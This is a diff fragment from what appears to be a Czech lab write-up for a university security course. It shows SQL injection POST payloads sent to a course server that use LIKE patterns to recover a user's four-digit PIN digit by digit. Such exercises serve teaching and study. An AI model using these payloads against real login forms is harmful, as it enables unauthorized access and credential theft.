@@ -37,8 +37,8 @@ Pozitivní odpovědi ve formátu "Welcome rux6j_moravja8, enter your four digit 
 
 Sending 'POST' request to URL : https://kbe.felk.cvut.cz/ <br />
 Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5___' OR '&password=<br />
-Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '_5__' OR '&password=<br />
-Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '__1_' OR '&password=<br />
+Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '_5\__' OR '&password=<br />
+Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '__1\_' OR '&password=<br />
 Post parameters : username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '___7' OR '&password=<br />
 
 **Ověření pinu:**<br />
